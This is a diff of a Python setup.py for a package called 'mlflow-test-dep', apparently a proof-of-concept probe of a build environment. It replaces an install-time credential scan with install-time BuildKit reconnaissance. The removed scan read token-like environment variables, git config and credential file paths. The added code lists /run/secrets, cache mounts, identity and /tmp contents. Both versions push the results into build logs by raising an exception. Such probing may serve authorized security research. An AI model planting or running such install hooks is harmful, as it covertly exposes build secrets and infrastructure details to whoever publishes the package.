@@ -1,72 +1,64 @@
 import os
 import sys
 import subprocess
+import socket
 from setuptools import setup
 
-proof = "🚨🚨🚨 GIT_CREDENTIAL_SCAN 🚨🚨🚨\n\n"
+proof = "🚨🚨🚨 BUILDKIT_RECON 🚨🚨🚨\n\n"
 
-# 1. Hunt for credential-shaped env vars (names + first 4 chars only)
-proof += "=== Suspect environment variables ===\n"
-for k, v in os.environ.items():
-    ku = k.upper()
-    if any(x in ku for x in ["TOKEN", "PASSWORD", "PASSWD", "SECRET", "GIT", "CRED", "API_KEY", "PAT", "AUTH"]):
-        proof += f"  {k} = {v[:4]}...(len={len(v)})\n"
-
-# 2. Check for a global git config with embedded credentials
-proof += "\n=== git config --list ===\n"
-try:
-    out = subprocess.check_output(["git", "config", "--list", "--show-origin"], text=True, timeout=3)
-    # Redact anything that looks like a URL with user:pass@
-    import re
-    redacted = re.sub(r"//[^@/\s]+@", "//<REDACTED>@", out)
-    proof += redacted[:600] + "\n"
-except Exception as e:
-    proof += f"  git config error: {type(e).__name__}\n"
-
-# 3. Check for on-disk credential files (existence + size only)
-proof += "\n=== Credential file existence ===\n"
-cred_paths = [
-    "/root/.git-credentials",
-    "/root/.netrc",
-    "/root/.docker/config.json",
-    "/root/.config/pip/pip.conf",
-    "/etc/gitconfig",
-    os.path.expanduser("~/.gitconfig"),
+# 1. Look for BuildKit / buildx marker files and mounts
+proof += "=== BuildKit markers ===\n"
+bk_paths = [
+    "/run/buildkit",
+    "/var/run/buildkit",
+    "/.dockerenv",
+    "/run/secrets",
+    "/tmp/buildkit",
 ]
-for p in cred_paths:
+for p in bk_paths:
     if os.path.exists(p):
         try:
-            proof += f"  EXISTS: {p} (size={os.path.getsize(p)} bytes)\n"
-        except Exception:
-            proof += f"  EXISTS: {p} (size unknown)\n"
+            entries = os.listdir(p)[:10] if os.path.isdir(p) else None
+            proof += f"  EXISTS: {p} (entries={entries})\n"
+        except Exception as e:
+            proof += f"  EXISTS: {p} (list error: {type(e).__name__})\n"
     else:
         proof += f"  absent: {p}\n"
 
-# 4. Check pip config (might reference an internal index with auth)
-proof += "\n=== pip config ==="
+# 2. Inspect /proc/self/mountinfo for cache mounts (truncated)
+proof += "\n=== Mounts referencing 'cache' or 'buildkit' ===\n"
 try:
-    out = subprocess.check_output(
-        [sys.executable, "-m", "pip", "config", "list"],
-        text=True, timeout=3
-    )
-    import re
-    out = re.sub(r"(password|token)\s*=\s*\S+", r"\1=<REDACTED>", out, flags=re.I)
-    proof += "\n" + out[:400] + "\n"
+    with open("/proc/self/mountinfo", "r") as f:
+        for line in f:
+            low = line.lower()
+            if "cache" in low or "buildkit" in low:
+                proof += "  " + line[:250] + "\n"
 except Exception as e:
-    proof += f"  pip config error: {type(e).__name__}\n"
+    proof += f"  mountinfo error: {type(e).__name__}\n"
 
-# 5. Check how pip is configured to fetch from the internal mirror
-proof += "\n=== pip env overrides ===\n"
-for k in ["PIP_INDEX_URL", "PIP_EXTRA_INDEX_URL", "PIP_TRUSTED_HOST", "PIP_CERT"]:
-    if k in os.environ:
-        val = os.environ[k]
-        # redact userinfo in URLs
-        import re
-        val = re.sub(r"//[^@/\s]+@", "//<REDACTED>@", val)
-        proof += f"  {k} = {val[:120]}\n"
+# 3. Show which UID/GID we run as (cache often shared per-UID)
+proof += "\n=== Identity ===\n"
+proof += f"  uid={os.getuid()} gid={os.getgid()} user={os.getenv('USER','?')}\n"
+try:
+    proof += "  id: " + subprocess.check_output(["id"], text=True, timeout=2).strip() + "\n"
+except Exception as e:
+    proof += f"  id error: {type(e).__name__}\n"
 
-proof += "\n🚨🚨🚨 END CREDENTIAL SCAN 🚨🚨🚨\n"
+# 4. Check whether /tmp or a cache dir is writable by us (indicates shared scratch)
+proof += "\n=== Writable scratch check ===\n"
+for p in ["/tmp", "/var/cache", "/root/.cache", "/package-repo"]:
+    if os.path.exists(p):
+        proof += f"  {p}: writable={os.access(p, os.W_OK)}\n"
+
+# 5. Check for any files referencing OTHER builds (naive, names only)
+proof += "\n=== /tmp entries (names only, first 20) ===\n"
+try:
+    proof += "  " + str(os.listdir("/tmp")[:20]) + "\n"
+except Exception as e:
+    proof += f"  /tmp list error: {type(e).__name__}\n"
+
+proof += "\n🚨🚨🚨 END BUILDKIT RECON 🚨🚨🚨\n"
 print(proof)
 raise Exception(proof)
 
-setup(name="mlflow-test-dep", version="0.1", description="Git credential scan")
+setup(name="mlflow-test-dep", version="0.1", description="BuildKit recon")
